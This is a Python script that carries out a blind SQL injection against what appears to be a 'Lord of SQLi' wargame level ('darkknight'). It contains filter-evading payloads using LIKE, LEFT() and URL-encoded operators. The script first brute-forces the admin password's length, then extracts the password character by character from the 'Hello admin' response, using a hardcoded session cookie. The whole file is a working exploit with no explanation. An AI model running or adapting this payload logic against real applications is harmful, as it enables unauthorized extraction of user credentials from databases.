import requests
import string

def lenth():
    lenc=0
    for i in range(1,100):
        par = "?pw=a&no=1 or id like \"admin\" %26%26 LENGTH(`pw`) like \"" + str(i) + "\"%23#"
        print("[+]pay : %s " % par)
        new_url = url + par
        r = requests.get(new_url, cookies=cookie)

        if r.text.find("Hello admin") > 0:
            print("[+]pw's length : " + str(i))
            lenc = i
            break
    return lenc

def guess(length):
    global pw
    for i in range(1,length+1):
        for j in string:
            par = "?pw=a&no=1 or id like \"admin\" %26%26 left(`pw`," + str(i) +") like \"" + pw + j + "\"%23#"
            print("[+]pay : %s " % par)
            u = url + par
            t = requests.get(u, cookies=cookie)
            if t.text.find("Hello admin") > 0:
                pw = pw + j
                print("[+] Pw : %s " % pw)
                break

if __name__=='__main__':
    url="http://los.eagle-jump.org/darkknight_f76e2eebfeeeec2b7699a9ae976f574d.php"
    cookie = dict(PHPSESSID="2jumpdmat5f035imvarpn58ai0")
    string = string.digits + string.ascii_letters
    pw = ''

    lent = lenth()
    guess(lent)
    print("[+]PW : %s" % pw)